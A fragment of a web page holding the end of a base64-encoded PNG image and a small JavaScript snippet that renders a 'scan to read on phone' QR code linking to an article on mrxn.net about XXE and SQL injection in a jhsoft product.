1Z7CAeuAePZ2mc5eF4PzzX3DTk75Rfk7oGcHvrPJ9vH3nHpXOmK0VROfvgzBF9X6WNHerC25seaxCusddWvWpjXkLZqFMsqJx/mWvErU30s+cQw97lvSE7nTbD9UAdPC65jXsM4+fAVzzTJgddOXOuPfHANMEmA7eMwzDiukRh27chNCywIcP0iNe0l/av2viH1NN7AbwPJtK7guG+Yn4r0AedgxmjSLzFYG/4MUyMcdeJkI68Y1mtIH4NeA32sPqOlduQVJxeEuV8biApue/0JTAMBTw1m/JPt5qmoPWBeA2iS1AiB7T04SXAMM46axOozWnJB2PuFS81RLB72Oth95WJgPnEw/YXTQCK68TUncA/kNed+uOq3DERXTXa4ykFCNbKD9PYWBb7m0v2uHfWtfHqGS1xxzCVeYeqSS1xxzIFfI3D/F8OPN/v6lhsCnnB9bWAuTwb0sXiYOfHpIz8G1ia3Qug1qb2iBdfCjqkDc0dx+BWCa4GWBrbb34jifMtASr/b/cMTmAaSp2qFR2udacFPQzTgGGjtgO6JuaIF18COqWuNP50Vv+I+5RNEC15rEpwQqRWC6+XLoI/FTQM56X2nfuAE2kDA04LneLQv2GuPNCteT4ZszIk7smhrHrx+ctDH4YXgHBjFPbO61ug/q1U+NfKrgfcA3J+yPt7sq92QN9vXP7ud/wEAAP//BCjyVgAAAAZJREFUAwAKoauVzPO+tAAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-Archives-XmlHttp-xxe-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 